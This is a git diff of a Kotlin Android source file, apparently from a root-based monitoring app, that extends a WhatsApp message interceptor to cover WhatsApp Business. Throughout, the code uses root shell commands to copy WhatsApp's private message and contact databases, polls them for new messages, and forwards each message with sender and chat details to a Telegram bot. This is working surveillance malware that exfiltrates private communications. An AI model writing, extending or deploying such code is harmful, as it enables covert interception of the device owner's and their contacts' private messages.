@@ -1,12 +1,12 @@
 package com.system.superiormonitor.monitor
 
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogLevel
 
 import android.content.Context
 import android.content.pm.PackageManager
 import android.database.sqlite.SQLiteDatabase
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
 import com.topjohnwu.superuser.Shell
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.*
@@ -25,14 +25,17 @@ import com.system.superiormonitor.bot.TelegramApi
  * Lifecycle is strictly tied to the parent coroutine scope (BotService).
  * When stop() is called or the scope is cancelled, the root watcher process is killed.
  */
+enum class WhatsAppVariant(val packageName: String, val logTag: String, val dirName: String) {
+    NORMAL("com.whatsapp", "WhatsAppMonitor", "whatsapp"),
+    BUSINESS("com.whatsapp.w4b", "WABusinessMonitor", "wabusiness")
+}
+
 class WhatsAppMonitor(
     private val context: Context,
+    private val variant: WhatsAppVariant,
     private val sendTelegram: (String, String?) -> Boolean
 ) {
     companion object {
-        private const val TAG = "WhatsAppMonitor"
-        private const val WA_PACKAGE = "com.whatsapp"
-        private const val DEFAULT_WA_DB_DIR = "/data/data/$WA_PACKAGE/databases"
         private const val DEBOUNCE_MS = 1500L
         private const val POLL_INTERVAL = "0.3"
 
@@ -41,10 +44,12 @@ class WhatsAppMonitor(
          * Tries multiple strategies to handle OEM path differences.
          * Returns the resolved path, or the default fallback.
          */
-        fun resolveWhatsAppDbDir(): String {
+        fun resolveWhatsAppDbDir(variant: WhatsAppVariant): String {
+            val packageName = variant.packageName
+            val defaultDbDir = "/data/data/$packageName/databases"
             // Strategy 1: Use dumpsys to find the actual dataDir
             try {
-                val result = Shell.cmd("dumpsys package $WA_PACKAGE | grep 'dataDir='").exec()
+                val result = Shell.cmd("dumpsys package $packageName | grep 'dataDir='").exec()
                 if (result.isSuccess) {
                     val dataDir = result.out
                         .firstOrNull { it.contains("dataDir=") }
@@ -63,8 +68,8 @@ class WhatsAppMonitor(
 
             // Strategy 2: Check common alternative paths
             val alternativePaths = listOf(
-                "/data/user/0/$WA_PACKAGE/databases",
-                "/data/data/$WA_PACKAGE/databases"
+                "/data/user/0/$packageName/databases",
+                "/data/data/$packageName/databases"
             )
             for (path in alternativePaths) {
                 try {
@@ -76,21 +81,22 @@ class WhatsAppMonitor(
             }
 
             // Fallback: return default
-            return DEFAULT_WA_DB_DIR
+            return defaultDbDir
         }
 
         /**
          * Checks if WhatsApp is installed on the device using root shell
          * to bypass Android 11+ package visibility restrictions.
          */
-        fun isWhatsAppInstalled(context: Context): Boolean {
+        fun isWhatsAppInstalled(context: Context, variant: WhatsAppVariant): Boolean {
+            val packageName = variant.packageName
             return try {
-                val result = Shell.cmd("pm path $WA_PACKAGE").exec()
+                val result = Shell.cmd("pm path $packageName").exec()
                 result.isSuccess && result.out.any { it.contains("package:") }
             } catch (e: Exception) {
                 // Fallback to PackageManager
                 try {
-                    context.packageManager.getPackageInfo(WA_PACKAGE, 0)
+                    context.packageManager.getPackageInfo(packageName, 0)
                     true
                 } catch (e2: Exception) {
                     false
@@ -103,17 +109,17 @@ class WhatsAppMonitor(
          * Uses dynamic path resolution.
          * Returns a pair: (available: Boolean, reason: String)
          */
-        fun checkWhatsAppDatabase(): Pair<Boolean, String> {
+        fun checkWhatsAppDatabase(variant: WhatsAppVariant): Pair<Boolean, String> {
             return try {
-                val dbDir = resolveWhatsAppDbDir()
+                val dbDir = resolveWhatsAppDbDir(variant)
                 val result = Shell.cmd("ls $dbDir/msgstore.db 2>/dev/null").exec()
                 if (result.isSuccess && result.out.isNotEmpty()) {
                     Pair(true, "Database found at $dbDir")
                 } else {
-                    Pair(false, "WhatsApp database files were not found. WhatsApp may not have been opened yet, or the data directory is inaccessible.")
+                    Pair(false, "${variant.logTag} database files were not found. App may not have been opened yet, or the data directory is inaccessible.")
                 }
             } catch (e: Exception) {
-                Pair(false, "Unable to verify WhatsApp database: ${e.message}")
+                Pair(false, "Unable to verify ${variant.logTag} database: ${e.message}")
             }
         }
 
@@ -151,15 +157,24 @@ class WhatsAppMonitor(
     }
 
     private val workDir: File by lazy {
-        val dir = context.getExternalFilesDir("whatsapp/watchdir")
-            ?: File(context.cacheDir, "whatsapp/watchdir")
+        val dir = File(context.filesDir, "${variant.dirName}/watchdir")
         dir.also { if (!it.exists()) it.mkdirs() }
     }
 
     private var contactsMap: Map<String, String> = emptyMap()
     private val prefsManager by lazy { com.system.superiormonitor.data.PrefsManager.getInstance(context) }
     private var watcherJob: Job? = null
-    private var waDbDir: String = DEFAULT_WA_DB_DIR  // Resolved dynamically on start()
+    private var waDbDir: String = ""  // Resolved dynamically on start()
+    
+    private var lastProcessedId: Long
+        get() = if (variant == WhatsAppVariant.NORMAL) prefsManager.whatsappLastProcessedId else prefsManager.whatsappBusinessLastProcessedId
+        set(value) {
+            if (variant == WhatsAppVariant.NORMAL) {
+                prefsManager.whatsappLastProcessedId = value
+            } else {
+                prefsManager.whatsappBusinessLastProcessedId = value
+            }
+        }
 
     // ═══════════════════════════════════════════════════════════
     //  PUBLIC API
@@ -170,65 +185,59 @@ class WhatsAppMonitor(
 
         watcherJob = scope.launch(Dispatchers.IO) {
             try {
-                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Starting WhatsApp monitor...")
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Starting ${variant.logTag} monitor...")
 
                 // 0. Fail-safe: Check if WhatsApp is installed
-                if (!isWhatsAppInstalled(context)) {
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] WhatsApp is not installed on this device. Monitor aborted.")
+                if (!isWhatsAppInstalled(context, variant)) {
+                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] ${variant.logTag} is not installed on this device. Monitor aborted.")
                     return@launch
                 }
 
                 // 0b. Fail-safe: Check if database files are accessible
-                val (dbAvailable, dbReason) = checkWhatsAppDatabase()
+                val (dbAvailable, dbReason) = checkWhatsAppDatabase(variant)
                 if (!dbAvailable) {
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] $dbReason. Monitor aborted.")
+                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] $dbReason. Monitor aborted.")
                     return@launch
                 }
 
                 // 0c. Resolve the actual database path for this device
-                waDbDir = resolveWhatsAppDbDir()
-                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resolved WhatsApp DB path: $waDbDir")
+                waDbDir = resolveWhatsAppDbDir(variant)
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Resolved ${variant.logTag} DB path: $waDbDir")
 
                 // 1. Load contacts once at startup
                 if (contactsMap.isEmpty()) {
                     contactsMap = loadContacts()
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Loaded ${contactsMap.size} contacts into memory.")
+                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Loaded ${contactsMap.size} contacts into memory.")
                 }
 
                 // 2. Establish or Catch-up baseline
                 syncDatabase()
                 val currentMaxId = getMaxMessageId()
                 
-                // Sanity check: If the stored ID is greater than the DB's max ID, WhatsApp data was cleared/wiped.
-                if (prefsManager.whatsappLastProcessedId > currentMaxId) {
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Database wipe detected (Stored: ${prefsManager.whatsappLastProcessedId}, Current Max: $currentMaxId). Resetting baseline.")
-                    prefsManager.whatsappLastProcessedId = currentMaxId
+                if (lastProcessedId > currentMaxId) {
+                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Database wipe detected (Stored: $lastProcessedId, Current Max: $currentMaxId). Resetting baseline.")
                 }
 
-                if (prefsManager.whatsappLastProcessedId == 0L) {
-                    prefsManager.whatsappLastProcessedId = currentMaxId
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (ID: ${prefsManager.whatsappLastProcessedId}). Watching for live messages...")
-                } else {
-                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resuming from ID: ${prefsManager.whatsappLastProcessedId}. Performing catch-up sync...")
-                    processNewMessages(isCatchUp = true)
-                }
+                // Universally establish a fresh baseline upon startup
+                lastProcessedId = currentMaxId
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Baseline established (ID: $lastProcessedId). Watching for live messages...")
 
                 // 3. Start the watcher flow
                 createWatcherFlow()
                     .debounce(DEBOUNCE_MS)
                     .collect {
                         try {
-                            processNewMessages(isCatchUp = false)
+                            processNewMessages()
                         } catch (e: CancellationException) {
                             throw e
                         } catch (e: Exception) {
-                            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Error processing messages: ${e.message}", LogLevel.ERROR)
+                            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Error processing messages: ${e.message}", LogLevel.ERROR)
                         }
                     }
             } catch (e: CancellationException) {
-                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Monitor cancelled.")
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Monitor cancelled.")
             } catch (e: Exception) {
-                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Fatal error: ${e.message}", LogLevel.ERROR)
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Fatal error: ${e.message}", LogLevel.ERROR)
             }
         }
     }
@@ -236,7 +245,7 @@ class WhatsAppMonitor(
     fun stop() {
         watcherJob?.cancel()
         watcherJob = null
-        LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Monitor stopped.")
+        LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Monitor stopped.")
     }
 
     // ═══════════════════════════════════════════════════════════
@@ -247,7 +256,7 @@ class WhatsAppMonitor(
     private fun createWatcherFlow(): Flow<Unit> = flow {
         val walPath = "$waDbDir/msgstore.db-wal"
 
-        LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Starting native Kotlin stat polling every ${POLL_INTERVAL}s.")
+        LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Starting native Kotlin stat polling every ${POLL_INTERVAL}s.")
 
         // Initial baseline
         var lastStat = Shell.cmd("stat -c '%Y' $walPath 2>/dev/null || echo 0").exec().out.joinToString("").trim()
@@ -271,16 +280,19 @@ class WhatsAppMonitor(
 
     private fun syncDatabase() {
         val destPath = workDir.absolutePath
+        val uid = android.os.Process.myUid()
 
         val result = Shell.cmd(
+            "rm -f $destPath/msgstore.db*",
             "cp $waDbDir/msgstore.db $destPath/msgstore.db",
             "cp $waDbDir/msgstore.db-wal $destPath/msgstore.db-wal 2>/dev/null || true",
             "cp $waDbDir/msgstore.db-shm $destPath/msgstore.db-shm 2>/dev/null || true",
+            "chown $uid:$uid $destPath/msgstore.db*",
             "chmod 666 $destPath/msgstore.db $destPath/msgstore.db-wal $destPath/msgstore.db-shm 2>/dev/null || true"
         ).exec()
 
         if (!result.isSuccess) {
-            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] DB sync failed: ${result.err.joinToString()}", LogLevel.ERROR)
+            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] DB sync failed: ${result.err.joinToString()}", LogLevel.ERROR)
         }
     }
 
@@ -292,15 +304,18 @@ class WhatsAppMonitor(
     private suspend fun loadContacts(): Map<String, String> {
         val contacts = mutableMapOf<String, String>()
         val destPath = workDir.absolutePath
+        val uid = android.os.Process.myUid()
 
         try {
             val copyResult = Shell.cmd(
-                "cp $waDbDir/wa.db $destPath/wa.db 2>/dev/null || cp $waDbDir/../databases/wa.db $destPath/wa.db 2>/dev/null || cp /data/data/$WA_PACKAGE/databases/wa.db $destPath/wa.db",
+                "rm -f $destPath/wa.db*",
+                "cp $waDbDir/wa.db $destPath/wa.db 2>/dev/null || cp $waDbDir/../databases/wa.db $destPath/wa.db 2>/dev/null || cp /data/data/${variant.packageName}/databases/wa.db $destPath/wa.db",
+                "chown $uid:$uid $destPath/wa.db*",
                 "chmod 666 $destPath/wa.db"
             ).exec()
 
             if (!copyResult.isSuccess) {
-                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Warning: Could not copy wa.db for contacts.")
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Warning: Could not copy wa.db for contacts.")
                 return contacts
             }
 
@@ -331,7 +346,7 @@ class WhatsAppMonitor(
 
             waDbFile.delete()
         } catch (e: Exception) {
-            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Error: Could not load contacts. (${e.message})", LogLevel.ERROR)
+            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Error: Could not load contacts. (${e.message})", LogLevel.ERROR)
         }
 
         return contacts
@@ -416,7 +431,7 @@ class WhatsAppMonitor(
                 }
             }
         } catch (e: Exception) {
-            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Error reading max ID: ${e.message}", LogLevel.ERROR)
+            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Error reading max ID: ${e.message}", LogLevel.ERROR)
             0L
         }
     }
@@ -426,7 +441,7 @@ class WhatsAppMonitor(
     //  Ports: print_new_rows() from Python PoC
     // ═══════════════════════════════════════════════════════════
 
-    private suspend fun processNewMessages(isCatchUp: Boolean = false) {
+    private suspend fun processNewMessages() {
         // Let the SQLite WAL file finish its micro-writes (matches Python's time.sleep(0.15))
         Thread.sleep(150)
 
@@ -434,46 +449,34 @@ class WhatsAppMonitor(
 
         val dbFile = File(workDir, "msgstore.db")
         if (!dbFile.exists()) {
-            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] msgstore.db not found after sync.", LogLevel.ERROR)
+            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] msgstore.db not found after sync.", LogLevel.ERROR)
             return
         }
 
         val db = SQLiteDatabase.openDatabase(
             dbFile.absolutePath, null,
-            SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
+            SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
         )
 
         db.use { database ->
             val rows = queryNewMessages(database)
 
             for (row in rows) {
-                if (row.id > prefsManager.whatsappLastProcessedId) {
+                if (row.id > lastProcessedId) {
                     val formatted = formatOutputMessage(row)
-                    if (isCatchUp) {
-                        com.system.superiormonitor.bot.OfflineManager.queueOnly(
-                            context = context,
-                            message = formatted,
-                            offlineSubdir = "whatsapp",
-                            offlineFileName = "offline_whatsapp.txt"
-                        )
-                    } else {
-                        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
-                            context = context,
-                            message = formatted,
-                            offlineSubdir = "whatsapp",
-                            offlineFileName = "offline_whatsapp.txt",
-                            sender = sendTelegram
-                        )
-                    }
-                    prefsManager.whatsappLastProcessedId = row.id
+                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+                        context = context,
+                        message = formatted,
+                        offlineSubdir = variant.dirName,
+                        offlineFileName = "offline_${variant.dirName}.txt",
+                        sender = sendTelegram
+                    )
+                    lastProcessedId = row.id
                 }
             }
 
             if (rows.isNotEmpty()) {
-                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded/Queued ${rows.size} new message(s).")
-                if (isCatchUp && com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
-                    com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(context, CoroutineScope(Dispatchers.IO))
-                }
+                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Forwarded/Queued ${rows.size} new message(s).")
             }
         }
     }
@@ -497,14 +500,14 @@ class WhatsAppMonitor(
         try {
             return executeQuery(db, MODERN_QUERY)
         } catch (e: Exception) {
-            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Modern query failed, falling back to legacy. (${e.message})")
+            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Modern query failed, falling back to legacy. (${e.message})")
         }
 
         // Fallback: older schema without jid_map
         try {
             return executeQuery(db, LEGACY_QUERY)
         } catch (e: Exception) {
-            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Legacy query also failed: ${e.message}", LogLevel.ERROR)
+            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Legacy query also failed: ${e.message}", LogLevel.ERROR)
         }
 
         return emptyList()
@@ -512,7 +515,7 @@ class WhatsAppMonitor(
 
     private suspend fun executeQuery(db: SQLiteDatabase, query: String): List<MessageRow> {
         val rows = mutableListOf<MessageRow>()
-        val cursor = db.rawQuery(query, arrayOf(prefsManager.whatsappLastProcessedId.toString()))
+        val cursor = db.rawQuery(query, arrayOf(lastProcessedId.toString()))
 
         cursor.use { c ->
             while (c.moveToNext()) {
@@ -589,9 +592,15 @@ class WhatsAppMonitor(
         val safeMsg = TelegramApi.escapeMarkdown(msg)
 
         // Exact markdown structure from Python PoC
-        return com.system.superiormonitor.bot.BotMessages.Alerts.buildWhatsAppMessage(
-            safeChatName, safeChatType, direction, timeFormatted, safeSentBy, safeToTarget, safeMsg
-        )
+        return if (variant == WhatsAppVariant.NORMAL) {
+            com.system.superiormonitor.bot.BotMessages.Alerts.buildWhatsAppMessage(
+                safeChatName, safeChatType, direction, timeFormatted, safeSentBy, safeToTarget, safeMsg
+            )
+        } else {
+            com.system.superiormonitor.bot.BotMessages.Alerts.buildWABusinessMessage(
+                safeChatName, safeChatType, direction, timeFormatted, safeSentBy, safeToTarget, safeMsg
+            )
+        }
     }
 }
 
